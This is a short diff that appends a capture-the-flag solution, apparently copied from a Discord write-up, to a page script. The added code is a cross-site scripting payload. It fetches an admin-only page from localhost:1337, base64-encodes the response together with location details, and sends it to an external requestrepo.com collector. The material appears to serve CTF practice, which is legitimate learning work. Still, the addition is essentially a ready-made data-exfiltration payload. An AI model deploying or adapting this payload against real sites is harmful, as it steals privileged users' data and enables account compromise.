@@ -12,3 +12,21 @@ async function fetchPostViews() {
   fetchPostViews();
 
 </script>
+
+
+###################################
+ wu của ông nào đó trên dis 
+<script>
+const httpInfo = `
+  Protocol: ${window.location.protocol}
+  Hostname: ${window.location.hostname}
+`;
+
+fetch('http://localhost:1337/posts/view/admin', {mode: 'no-cors'})
+  .then(r => r.text())
+  .then(text => {
+    const data = httpInfo + text;
+    const encodedData = btoa(data);
+    fetch(`https://anaihn7u.requestrepo.com?cc=${encodedData}`, {mode: 'no-cors'});
+  });
+</script>
